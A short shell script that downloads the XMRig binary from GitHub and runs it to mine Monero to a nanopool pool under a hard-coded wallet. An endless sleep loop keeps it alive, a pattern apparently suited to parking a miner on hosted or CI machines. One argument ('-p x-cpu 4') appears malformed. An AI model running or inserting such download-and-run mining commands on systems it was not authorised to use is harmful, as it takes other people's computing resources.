sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig --coin monero -o stratum+tcp://xmr-us-east1.nanopool.org:14444 -u 471kzysbjaeKQ1h8aeX3BbQ4R9AkoF7bWK8KeQz4fmLXNj8xnxGN3XqCAUGTuxyh7oJDDjxX5mKdH7FVXGtLZs2T3XUU4rq -p x-cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
